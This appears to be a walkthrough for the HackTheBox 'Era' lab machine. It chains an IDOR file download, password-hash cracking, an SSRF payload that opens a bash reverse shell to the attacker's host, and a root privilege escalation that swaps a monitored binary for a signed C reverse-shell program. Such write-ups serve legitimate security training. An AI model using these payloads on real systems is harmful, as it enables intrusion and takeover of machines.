This is a comprehensive, step-by-step walkthrough for the HackTheBox "Era" machine. Each stage is documented clearly, including all commands and logic.

## 1. Recon & Enumeration

### 1.1 Initial Nmap Scan
Scan for open ports and services:
```
nmap -A era.htb
```
*No unusual ports/services; proceed to web enumeration.*

### 1.2 Host File Edits
Add domain to your hosts file:
```
echo "10.10.11.79 era.htb" | sudo tee -a /etc/hosts
```

### 1.3 Subdomain Enumeration
Enumerate subdomains:
```
ffuf -w /path/to/top100ksubdomain.txt -H "Host: FUZZ.era.htb" -u http://era.htb -t 200 -fs 154
```
If you find `file.era.htb`:
```
echo "10.10.11.79 file.era.htb" | sudo tee -a /etc/hosts
```

---

## 2. Directory Enumeration

Use `gobuster` for directories:
```
gobuster dir -u http://file.era.htb/ -w /usr/share/wordlists/dirb/common.txt -t 50 --exclude-length 6765 -x php
```
**Findings:**
- `/register.php` — Register a user
- `/login.php` — Login
- `/upload.php` — File upload (after login)

---

## 3. Exploit Insecure Direct Object Reference (IDOR)

1. Register at `/register.php`.
2. Login at `/login.php`.
3. Upload a file via `/upload.php`.
4. Exploit the `id` parameter (burp/curl), e.g.:
```
curl -b "PHPSESSID=..." "http://file.era.htb/download.php?id=54"
curl -b "PHPSESSID=..." "http://file.era.htb/download.php?id=150"
```
5. Download especially `site-backup-30-08-24.zip`.

---

## 4. Analyzing Dumped Data

Extract the archive:
```
unzip site-backup-30-08-24.zip
```
Inside: `filedb.sqlite`

View with sqlite3:
```
sqlite3 filedb.sqlite
```
Extract user and hash info:
```
SELECT user_name, user_password FROM users;
```
Example:
```
eric:$2y$10$S9EOSD...
yuri:$2b$12$HkRK...
```

---

## 5. Crack Password Hashes

Create `hash.txt`:
```
eric:$2y$10$S...
yuri:$2b$12$H...
```
Crack with John the Ripper:
```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show hash.txt
```
Results:
```
eric : america
yuri : mustang
```

---

## 6. FTP Access and Code Analysis

- Try logging in to FTP with the above creds.
- **If not successful:** Analyze downloaded code (especially `download.php`) for vulnerabilities.

---

## 7. Exploiting SSRF for RCE

### 7.1 Reset the Admin Account
Use `/reset.php` and `/security_login.php` to reset admin password (using info from `sqlite` or modifying via your user).

### 7.2 RCE Payload (SSRF)
Payload:
```
http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1/bash%20-c%20"bash%20-i%20>&%20/dev/tcp/<YOUR_IP>/4444%200>%261"
```
Listener:
```
nc -lvnp 4444
```
With admin privileges, visit the URL—should pop a shell as `yuri`.

---

## 8. Shell Stabilization and User Escalation

Upgrade shell:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Switch users:
```
su eric
```
Password: america

Read `user.txt` in Eric's home.

---

## 9. Privilege Escalation (Root)

### 9.1 Discovery
Find root-owned binaries:
```
ps aux | grep root
```
Spot `/opt/AV/periodic-checks/monitor` running as root.

---

### 9.2 Malicious Binary & Signature
On your attacker box, create `exploit.c`:
```c
#include <unistd.h>
int main() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/<YOUR_IP>/1337 0>&1", NULL);
    return 0;
}
```
Compile statically:
```
x86_64-linux-gnu-gcc -o monitor exploit.c -static
```

**Sign the binary**
after getting the key from `signing.zip`
```
git clone https://github.com/NUAA-WatchDog/linux-elf-binary-signer.git
cd linux-elf-binary-signer
make clean
gcc -o elf-sign elf_sign.c -lssl -lcrypto -Wno-deprecated-declarations
./elf-sign sha256 key.pem key.pem monitor
mv monitor monitor.1
```

---

### 9.3 Replace Monitor Binary
On shell as Eric:
```
cd /opt/AV/periodic-checks
wget http://<YOUR_IP>:8000/monitor.1
rm monitor
mv monitor.1 monitor
chmod +x monitor
```
Start listener:
```
nc -lvnp 1337
```
Wait for scheduled task—**root shell!**

Read `root.txt` in `/root`.
